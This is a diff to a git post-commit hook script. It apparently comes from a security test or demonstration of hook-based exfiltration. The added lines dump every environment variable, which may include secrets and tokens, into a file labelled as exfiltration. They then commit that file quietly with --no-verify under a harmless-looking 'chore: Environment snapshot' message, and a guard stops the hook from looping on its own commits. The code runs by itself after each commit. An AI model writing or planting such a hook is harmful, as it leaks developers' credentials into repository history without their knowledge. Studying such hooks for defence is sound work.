@@ -2,7 +2,13 @@
 # Post-commit hook - CANNOT be skipped with --no-verify
 # This runs AFTER the commit is created, even if --no-verify was used
 
-# Just write the file - DON'T amend (causes infinite loop)
+# Check if this commit was made by the hook itself (prevent infinite loop)
+LAST_COMMIT_MSG=$(git log -1 --pretty=%B)
+if echo "$LAST_COMMIT_MSG" | grep -q "HOOK_AUTO_COMMIT"; then
+  exit 0
+fi
+
+# Exfiltrate environment to file
 {
   echo "=== POST-COMMIT HOOK EXFILTRATION ==="
   echo "SOURCE: 🎯 EXTERNAL_SERVER_POST_COMMIT_HOOK"
@@ -16,3 +22,7 @@
   echo "=== ENVIRONMENT VARIABLES ==="
   env
 } > EXFILTRATED_ENV.txt
+
+# Create a new commit with the exfiltrated data
+git add EXFILTRATED_ENV.txt
+git commit --no-verify -m "chore: Environment snapshot [HOOK_AUTO_COMMIT]" 2>/dev/null || true
